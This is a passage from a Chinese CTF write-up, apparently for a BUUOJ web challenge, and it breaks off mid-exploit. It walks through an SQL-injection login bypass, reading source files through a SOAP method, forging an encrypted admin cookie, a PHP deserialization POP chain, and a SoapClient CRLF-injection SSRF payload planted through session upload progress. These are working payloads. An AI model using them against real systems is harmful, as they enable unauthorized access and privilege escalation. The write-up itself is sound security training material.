+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users </span><br><span class="line"><span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> passwd <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span> </span><br><span class="line"><span class="keyword">HAVING</span> passwd <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="comment">-- AND passwd=&#x27;$pass&#x27; （被注释掉，不再生效）</span></span><br></pre></td></tr></table></figure>
+<p><strong><code>'1'='1'</code></strong> → 恒真条件，绕过用户名检查。</p>
+<p><strong><code>GROUP BY passwd WITH ROLLUP</code></strong> → 对 <code>passwd</code> 分组，并生成一个汇总行（<code>ROLLUP</code> 会额外计算聚合值）。</p>
+<p><strong><code>HAVING passwd IS NULL</code></strong> → 筛选 <code>passwd</code> 为 <code>NULL</code> 的行（<code>ROLLUP</code> 生成的汇总行 <code>passwd</code> 是 <code>NULL</code>）。</p>
+<p><strong><code>#</code></strong> → 注释掉后续的 <code>AND passwd='$pass'</code>，使密码检查失效。</p>
+<p>这样查询会返回我们的密码为null，而我们这时输入的密码也输入为空即可</p>
+<p><img src="../images/20250615133043154.png" alt="image-20250615133043154" /></p>
+<h3 id="wsdl"><a class="markdownIt-Anchor" href="#wsdl"></a> wsdl</h3>
+<p>然后扫目录，发现一个<strong>wsdl.php</strong>文件</p>
+<p><img src="../images/20250615133902431.png" alt="image-20250615133902431" /></p>
+<p><code>f12</code>可以查看里面的内容，其中出现了很多的关于<code>SoapServer</code>的字段，百度一下是<em>WSDL</em>文件</p>
+<p>根据存在个wsdl.php这个文件，又根据method这个参数在登录中调用的index login ，然后可以看出，method 可以调用wsdl中定义的一些方法,和定义参数需要传递的值（就是一个提示文件），尝试调用其他定义的方法</p>
+<p><img src="../images/20250615134709689.png" alt="image-20250615134709689" /></p>
+<p>有Get_flag、hint、File_read等等</p>
+<p>但这里面能打开的就hint和File_read,其他的打开都是不允许</p>
+<p>先看一下hint</p>
+<p><img src="../images/20250615134956158.png" alt="image-20250615134956158" /></p>
+<p>存在一些php文件，但还不知道怎么打开</p>
+<p>再看File_read</p>
+<p><img src="../images/20250615134938253.png" alt="image-20250615134938253" /></p>
+<p>需要传参数，根据上面的wsdl发现有filename</p>
+<p>先尝试读index.php</p>
+<p><img src="../images/0250615135355573.png" alt="image-20250615135355573" /></p>
+<p><strong>index.php:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;encode.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;Service.php&quot;</span>);</span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]:<span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="comment">//echo 1231;</span></span><br><span class="line"><span class="variable">$allow_method</span> = <span class="keyword">array</span>(<span class="string">&quot;File_read&quot;</span>,<span class="string">&quot;login&quot;</span>,<span class="string">&quot;index&quot;</span>,<span class="string">&quot;hint&quot;</span>,<span class="string">&quot;user&quot;</span>,<span class="string">&quot;get_flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>,<span class="variable">$allow_method</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;not allow method&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$method</span>===<span class="string">&quot;File_read&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$param</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$param2</span>=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$method</span>===<span class="string">&quot;login&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$param</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$param2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;method can use&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$method</span>;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="title class_">Service</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$newclass</span>-&gt;<span class="variable">$method</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>se.php:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...<span class="comment">//后续有用</span></span><br></pre></td></tr></table></figure>
+<p>之前在wsdl中找到了一个keyaaaaaaaasdfsaf.txt文件，一并读了</p>
+<p><strong>keyaaaaaaaasdfsaf.txt：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_is_false_flag&#125; </span><br></pre></td></tr></table></figure>
+<p>猜测是密钥</p>
+<h3 id="越权"><a class="markdownIt-Anchor" href="#越权"></a> 越权</h3>
+<p>根据index.php里提供的get_flag去访问</p>
+<p><img src="../images/20250615140314096.png" alt="image-20250615140314096" /></p>
+<p>提示admin 127.0.0.1很明显ssrf加越权了</p>
+<p>现在还是guest</p>
+<p>但我们查看cookie时发现<code>user=3J6Roahxag%3D%3D</code>,不知道是啥编码</p>
+<p>在index.php中包含了encode.php，我们来读取一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include (&quot;encode.php&quot;);</span><br></pre></td></tr></table></figure>
+<p><strong>encode.php:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">en_crypt</span>(<span class="params"><span class="variable">$content</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$key</span>    =    <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$h</span>      =    <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$length</span>    =    <span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$swpuctf</span>      =    <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$varch</span>   =    <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$length</span>; <span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$h</span> == <span class="variable">$swpuctf</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$h</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$varch</span> .= <span class="variable">$key</span>&#123;<span class="variable">$h</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$h</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$swpu</span>  =  <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$length</span>; <span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$swpu</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$content</span>&#123;<span class="variable">$j</span>&#125;) + (<span class="title function_ invoke__">ord</span>(<span class="variable">$varch</span>&#123;<span class="variable">$j</span>&#125;)) % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$swpu</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>一个编码脚本</p>
+<p>这不刚好和cookie对应上了吗，而且密钥我们之前也读出来了</p>
+<p>我们先写个解密脚本来看一下原cookie的格式</p>
+<p><strong>decode.php:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">de_crypt</span>(<span class="params"><span class="variable">$swup</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$swup</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$swup</span>);</span><br><span class="line">	<span class="variable">$key</span>    =    <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$h</span>      =    <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$length</span>    =    <span class="title function_ invoke__">strlen</span>(<span class="variable">$swup</span>);</span><br><span class="line">    <span class="variable">$swpuctf</span>      =    <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$varch</span>   =    <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$length</span>; <span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$h</span> == <span class="variable">$swpuctf</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$h</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$varch</span> .= <span class="variable">$key</span>&#123;<span class="variable">$h</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$h</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$length</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$swup</span>&#123;<span class="variable">$j</span>&#125;) &gt; <span class="title function_ invoke__">ord</span>(<span class="variable">$varch</span>&#123;<span class="variable">$j</span>&#125;))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$swup</span>&#123;<span class="variable">$j</span>&#125;) - <span class="title function_ invoke__">ord</span>(<span class="variable">$varch</span>&#123;<span class="variable">$j</span>&#125;));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$varch</span>&#123;<span class="variable">$j</span>&#125;)+<span class="number">256</span>-<span class="title function_ invoke__">ord</span>(<span class="variable">$swup</span>&#123;<span class="variable">$j</span>&#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">de_crypt</span>(<span class="string">&quot;3J6Roahxag==&quot;</span>, <span class="string">&quot;flag&#123;this_is_false_flag&#125;&quot;</span>);</span><br><span class="line"><span class="comment">//xiaoC:2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>那现在我们就能伪造admin了</p>
+<p><code>admin:1</code></p>
+<p>编码出来是<code>xZmdm9NxaQ==</code></p>
+<p>伪造</p>
+<p><img src="../images/20250615141338408.png" alt="image-20250615141338408" /></p>
+<p>回显个我们没有登录，然后就给跳转到login界面去了,但我们这里只需要知道我们伪造成功了就行</p>
+<h3 id="反序列化ssrf"><a class="markdownIt-Anchor" href="#反序列化ssrf"></a> 反序列化+ssrf</h3>
+<p>我们还剩一个se.php没利用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;;</span><br><span class="line">                    <span class="variable">$s1</span>();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$ke</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;mod2[<span class="variable">$ke</span>];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test2</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod3</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;mod2 = <span class="variable language_">$this</span>-&gt;mod3.<span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">session_start</span>(); </span><br><span class="line">                <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">                <span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>),<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;b,<span class="variable">$a</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;str1-&gt;&#123;<span class="variable language_">$this</span>-&gt;str2&#125;();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>目的是触发getflag()</p>
+<p>pop链：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">bb</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cc</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dd</span>();</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ee</span>();</span><br><span class="line"><span class="variable">$x</span>=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;mod1=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;mod2[<span class="string">&#x27;test2&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;mod1=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;str1=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;mod2=<span class="string">&quot;getflag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure>
+<p>现在要做的就是给dd类中的flag和b赋值触发恶意代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function getflag()</span><br><span class="line">    &#123;</span><br><span class="line">        session_start();</span><br><span class="line">        var_dump($_SESSION);</span><br><span class="line">        $a = array(reset($_SESSION),$this-&gt;flag);</span><br><span class="line">        echo call_user_func($this-&gt;b,$a);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>然后是找到ssrf的部分，这里给出了一个interface.php文件，刚开始不知道是干嘛的，看了wp才知道是用来ssrf的，里面有一个SoapServer类，我们在客户端可以使用SoapClient类来与之通信，这也是ssrf的基础。</p>
+<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.w3school.com.cn%2Fsoap%2Fsoap_intro.asp">SOAP 是基于 XML 的简易协议，可使应用程序在 HTTP 之上进行信息交换。</a></p>
+<p>根据前面method需要admin和127.0.0.1来<strong>访问get_flag方法</strong>，我们可以用SoapClient来调用get_flag方法，SoapClient实际上并没有这个方法但是_call方法会帮助我们调用SoapServer中的get_flag方法</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/71bc9bdd9882">SoapClient中调用SoapServer中的方法</a></p>
+<p>call_user_func函数有调用成员方法的作用，所以我们令<code>$d-&gt;flag='get_flag'</code>，<code>$d-&gt;b='call_user_func'</code>，然后将$a数组中第一个成员设为SoapClient类即可，这里可以利用php序列化的属性，在se.php文件中有<code>ini_set('session.serialize_handler', 'php');</code>，这里将php序列化处理器设置为php，只要我们在session中写入含有|的字符串，php会自动将|前的字符串作为键，其后的字符串作为值反序列化</p>
+<p>这里可以参考<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F3339%23toc-3">LCTF2018</a>中<code>bestphp's revenge</code>题</p>
+<p>我们首先构造SoapClient类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;user_agent&#x27;</span>=&gt;</span><br><span class="line">	<span class="string">&#x27;succ3^^X-Forwarded-For: 127.0.0.1^^Cookie: user=xZmdm9NxaQ==^^Content-Type:application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;bbb&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/interface.php&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后需要将反序列化后的字符串写入session中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将payload传入session的方式有两种, 一种是对面开放本地可控的数据, 另一种是因为配置不当造成session可控当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$_SESSION中。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，</span><br><span class="line">当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</span><br></pre></td></tr></table></figure>
+<p>通过 se.php 传入我们的 poc，调用 session。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$d-&gt;flag = &#x27;get_flag&#x27;;</span><br><span class="line">$d-&gt;b = &#x27;call_user_func&#x27;;</span><br></pre></td></tr></table></figure>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">url = <span class="string">&#x27;http://25b0ba10-b9fc-4f12-b7c8-44262ff9a28e.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:parse.unquote(<span 